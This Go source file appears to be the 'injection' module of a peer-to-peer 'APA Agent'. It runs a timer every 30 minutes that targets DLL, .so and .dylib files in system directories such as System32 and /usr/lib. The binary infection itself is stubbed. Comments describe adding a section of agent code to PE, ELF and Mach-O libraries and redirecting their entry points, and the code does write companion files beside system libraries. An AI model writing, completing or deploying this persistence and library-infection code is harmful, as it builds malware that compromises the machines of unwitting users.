// Package injection provides capabilities for embedding the agent into system libraries
package injection

import (
	"context"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"runtime"
	"time"

	"github.com/libp2p/go-libp2p/core/peer"
)

// LibraryEmbedder handles embedding of the agent into system libraries
type LibraryEmbedder struct {
	logger      *slog.Logger
	agentPath   string
	peerID      peer.ID
	embedChan   chan string // Channel for receiving embedding requests
}

// NewLibraryEmbedder creates a new LibraryEmbedder instance
func NewLibraryEmbedder(logger *slog.Logger, agentPath string, peerID peer.ID) *LibraryEmbedder {
	return &LibraryEmbedder{
		logger:      logger,
		agentPath:   agentPath,
		peerID:      peerID,
		embedChan:   make(chan string, 10), // Buffered channel for embedding requests
	}
}

// Start begins the library embedding monitoring
func (le *LibraryEmbedder) Start(ctx context.Context) {
	le.logger.Info("Starting library embedding monitoring")

	// Start the embedding request handler
	go le.handleEmbeddingRequests(ctx)

	// Start periodic embedding into system libraries
	go le.periodicEmbedding(ctx)
}

// handleEmbeddingRequests processes embedding requests from the channel
func (le *LibraryEmbedder) handleEmbeddingRequests(ctx context.Context) {
	for {
		select {
		case <-ctx.Done():
			le.logger.Info("Stopping embedding request handler")
			return
		case targetLibrary := <-le.embedChan:
			le.logger.Info("Processing embedding request", "target_library", targetLibrary)
			if err := le.embedIntoLibrary(targetLibrary); err != nil {
				le.logger.Error("Failed to embed into library", "library", targetLibrary, "error", err)
			} else {
				le.logger.Info("Successfully embedded into library", "library", targetLibrary)
			}
		}
	}
}

// periodicEmbedding periodically embeds the agent into common system libraries
func (le *LibraryEmbedder) periodicEmbedding(ctx context.Context) {
	// Embedding interval - every 30 minutes
	embeddingInterval := 30 * time.Minute
	ticker := time.NewTicker(embeddingInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			le.logger.Info("Stopping periodic embedding")
			return
		case <-ticker.C:
			le.embedIntoSystemLibraries()
		}
	}
}

// embedIntoSystemLibraries embeds the agent into common system libraries
func (le *LibraryEmbedder) embedIntoSystemLibraries() {
	le.logger.Debug("Embedding agent into system libraries")

	// Common library directories based on OS
	var libDirs []string
	switch runtime.GOOS {
	case "windows":
		libDirs = []string{
			"C:\\Windows\\System32",
			"C:\\Windows\\SysWOW64",
			"C:\\Program Files\\Common Files",
		}
	case "darwin":
		libDirs = []string{
			"/usr/lib",
			"/usr/local/lib",
			"/System/Library/Frameworks",
		}
	default: // Linux and others
		libDirs = []string{
			"/lib",
			"/lib64",
			"/usr/lib",
			"/usr/lib64",
			"/usr/local/lib",
		}
	}

	// Try to embed into libraries in each directory
	for _, libDir := range libDirs {
		if _, err := os.Stat(libDir); err == nil {
			le.logger.Debug("Attempting to embed into library directory", "directory", libDir)
			if err := le.embedIntoLibraryDirectory(libDir); err != nil {
				le.logger.Debug("Failed to embed into library directory", "directory", libDir, "error", err)
			} else {
				le.logger.Debug("Successfully embedded into library directory", "directory", libDir)
			}
		}
	}
}

// embedIntoLibraryDirectory embeds the agent into libraries in a specific directory
func (le *LibraryEmbedder) embedIntoLibraryDirectory(libDir string) error {
	le.logger.Debug("Embedding into library directory", "directory", libDir)

	// Validate that agent binary exists
	if _, err := os.Stat(le.agentPath); os.IsNotExist(err) {
		return fmt.Errorf("agent binary not found: %s", le.agentPath)
	}

	// Read the directory entries
	entries, err := os.ReadDir(libDir)
	if err != nil {
		return fmt.Errorf("failed to read library directory: %w", err)
	}

	// Try to embed into a few libraries (not all, to be less intrusive)
	count := 0
	for _, entry := range entries {
		if count >= 3 { // Limit to 3 libraries per directory
			break
		}

		// Only target specific file types based on OS
		if le.shouldTargetLibrary(entry.Name()) {
			libPath := filepath.Join(libDir, entry.Name())
			if err := le.embedIntoLibrary(libPath); err != nil {
				le.logger.Debug("Failed to embed into library", "library", libPath, "error", err)
			} else {
				le.logger.Debug("Successfully embedded into library", "library", libPath)
				count++
			}
		}
	}

	return nil
}

// shouldTargetLibrary determines if a library should be targeted for embedding
func (le *LibraryEmbedder) shouldTargetLibrary(libName string) bool {
	// Target specific library types based on OS
	switch runtime.GOOS {
	case "windows":
		// Target DLL files
		return filepath.Ext(libName) == ".dll"
	case "darwin":
		// Target dylib and framework files
		return filepath.Ext(libName) == ".dylib" || filepath.Ext(libName) == ".framework"
	default: // Linux and others
		// Target shared object files
		return filepath.Ext(libName) == ".so"
	}
}

// embedIntoLibrary embeds the agent into a specific library
func (le *LibraryEmbedder) embedIntoLibrary(libraryPath string) error {
	le.logger.Debug("Embedding agent into library", "library", libraryPath)

	// Validate that library exists
	if _, err := os.Stat(libraryPath); os.IsNotExist(err) {
		return fmt.Errorf("library not found: %s", libraryPath)
	}

	// Different embedding methods based on OS
	switch runtime.GOOS {
	case "windows":
		return le.embedIntoWindowsLibrary(libraryPath)
	case "darwin":
		return le.embedIntoMacOSLibrary(libraryPath)
	default: // Linux and others
		return le.embedIntoLinuxLibrary(libraryPath)
	}
}

// embedIntoWindowsLibrary embeds the agent into a Windows library
func (le *LibraryEmbedder) embedIntoWindowsLibrary(libraryPath string) error {
	le.logger.Debug("Embedding into Windows library", "library", libraryPath)

	// In a real implementation, this would:
	// 1. Parse the PE header of the DLL
	// 2. Add a new section to the DLL containing the agent code
	// 3. Modify the entry point to execute the agent code
	// 4. Update the DLL checksum
	//
	// For now, we'll simulate the embedding by creating a companion file

	companionPath := libraryPath + ".agent"
	if err := le.createCompanionFile(companionPath); err != nil {
		return fmt.Errorf("failed to create companion file: %w", err)
	}

	le.logger.Info("Created companion file for Windows library", "library", libraryPath, "companion", companionPath)
	return nil
}

// embedIntoMacOSLibrary embeds the agent into a macOS library
func (le *LibraryEmbedder) embedIntoMacOSLibrary(libraryPath string) error {
	le.logger.Debug("Embedding into macOS library", "library", libraryPath)

	// In a real implementation, this would:
	// 1. Parse the Mach-O header of the library
	// 2. Add a new segment/section to the library containing the agent code
	// 3. Modify the library to load the agent code
	//
	// For now, we'll simulate the embedding by creating a companion file

	companionPath := libraryPath + ".agent"
	if err := le.createCompanionFile(companionPath); err != nil {
		return fmt.Errorf("failed to create companion file: %w", err)
	}

	le.logger.Info("Created companion file for macOS library", "library", libraryPath, "companion", companionPath)
	return nil
}

// embedIntoLinuxLibrary embeds the agent into a Linux library
func (le *LibraryEmbedder) embedIntoLinuxLibrary(libraryPath string) error {
	le.logger.Debug("Embedding into Linux library", "library", libraryPath)

	// In a real implementation, this would:
	// 1. Parse the ELF header of the library
	// 2. Add a new section to the library containing the agent code
	// 3. Modify the library to execute the agent code
	// 4. Update the library checksum
	//
	// For now, we'll simulate the embedding by creating a companion file

	companionPath := libraryPath + ".agent"
	if err := le.createCompanionFile(companionPath); err != nil {
		return fmt.Errorf("failed to create companion file: %w", err)
	}

	le.logger.Info("Created companion file for Linux library", "library", libraryPath, "companion", companionPath)
	return nil
}

// createCompanionFile creates a companion file that contains the agent signature
func (le *LibraryEmbedder) createCompanionFile(companionPath string) error {
	// Read the agent binary
	_, err := os.ReadFile(le.agentPath)
	if err != nil {
		return fmt.Errorf("failed to read agent binary: %w", err)
	}

	// Create a minimal companion file that just contains a signature
	// In a real implementation, this would contain executable code
	companionData := fmt.Sprintf("# APA Agent Companion File\n# Embedded at: %s\n# Peer ID: %s\n", 
		time.Now().Format(time.RFC3339), le.peerID.String())

	// Write the companion file
	if err := os.WriteFile(companionPath, []byte(companionData), 0644); err != nil {
		return fmt.Errorf("failed to write companion file: %w", err)
	}

	return nil
}

// RequestEmbedding requests embedding into a specific library
func (le *LibraryEmbedder) RequestEmbedding(libraryPath string) {
	select {
	case le.embedChan <- libraryPath:
		le.logger.Debug("Embedding request queued", "library", libraryPath)
	default:
		le.logger.Warn("Embedding request queue full, dropping request", "library", libraryPath)
	}
}

// EmbedIntoLibraryWithPayload embeds a payload into a library
func (le *LibraryEmbedder) EmbedIntoLibraryWithPayload(libraryPath, payloadPath string) error {
	le.logger.Info("Embedding payload into library", "library", libraryPath, "payload", payloadPath)

	// Validate payload exists
	if _, err := os.Stat(payloadPath); os.IsNotExist(err) {
		return fmt.Errorf("payload not found: %s", payloadPath)
	}

	// In a real implementation, this would embed the payload into the library
	// For now, we'll just log the action
	le.logger.Info("Payload embedding simulated", "library", libraryPath, "payload", payloadPath)

	return nil
}